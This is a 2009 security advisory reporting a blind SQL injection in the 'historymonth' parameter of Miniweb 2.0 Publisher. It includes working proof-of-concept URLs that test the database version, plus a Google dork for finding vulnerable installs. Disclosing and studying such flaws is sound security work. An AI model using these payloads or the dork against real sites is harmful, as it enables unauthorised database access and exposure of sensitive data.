@@ -1,0 +1,83 @@
+[ECHO_ADV_109$2009] Miniweb 2.0 (Publisher) Blind Sql Injection Vulnerability
+Author : K-159
+Date : May, 21 st 2009
+Location : Jakarta, Indonesia
+Web : http://e-rdc.org/v1/news.php?readmore=135
+Critical Lvl : Moderate
+Impact : Exposure of sensitive information
+Where : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : Miniweb 2.0 Publisher
+version : <= X9
+Vendor : http://www.miniweb2.com/index.php?module=sitebuilder&sitebuilder_id=14
+Description :
+
+Will your killer Web publishing application cost you an arm and a leg or bring you a massive amount of traffic?
+Poorly designed applications not only cost you time and money, they also give your site users a bad experience.
+With these factors in mind, we make Miniweb 2.0 Publisher extremely easy to use and administer.
+Only three codes are required to plug and play it on your site. The plugin contents are static HTML, 
+and they will fit your Web design 100%. Publisher comes with such popular Web traffic attractions as content search, 
+article comments, ratings, RSS/Atom syndication, tagging services, image uploads, smileys, etc. 
+In practice, you can also use it to create a member-based publishing platform. 
+Article postings by members require approval and can be monitored via email and text alerts.
+You can also charge members based on the number of postings.
+
+--------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "historymonth" parameter in index.php page is not properly verified before being used 
+into sql queries.This vulnerability can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+Poc/Exploit:
+~~~~~~~~
+
+http://www.example.com/[publisher_path]/index.php?historyyear=2009&historymonth=[SQL]
+http://www.example.com/[publisher_path]/index.php?historyyear=2009&historymonth=02%20and%20substring(@@version,1,1)=5
+http://www.example.com/[publisher_path]/index.php?historyyear=2009&historymonth=02%20and%20substring(@@version,1,1)=4
+
+
+Dork:
+~~~~
+Google : " allinurl : publisher/index.php?historyyear= "
+
+
+Solution:
+~~~~~~
+- Edit the source code to ensure that input is properly verified.
+
+Timeline:
+~~~~~~~~
+
+- 06 - 05 - 2009 bug found
+- 06 - 05 - 2009 vendor contacted but no response
+- 21 - 05 - 2009 advisory release
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, zizau "happy anniversary"- my beloved son, i-eyes - my beloved daughter.
+~ y3dips (congratz for the new son),the_day,Negatif,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az001,
+the_hydra,neng chika, str0ke
+~ scanners [at] SCAN-NUSANTARA and SCAN-ASSOCIATES
+~ SK,Abond,pokley,cybertank, super_temon,whatsoever,b120t0,inggar,fachri,adi,rahmat,indra
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,cyb3rh3b,cR4SH3R,ogeb,bagan,devsheed
+~ dr188le,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,ghostblup,shamus,
+kuntua, stev_manado,nofry,k1tk4t,0pt1c
+~ newbie_hacker@yahoogroups.com
+~ milw0rm.com, macaholic.info, unitiga.com, mac.web.id, indowebster.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+K-159 || echo|staff || adv[at]e-rdc[dot]org
+Homepage: http://www.e-rdc.org/
+
+-------------------------------- [ EOF ] ----------------------------------
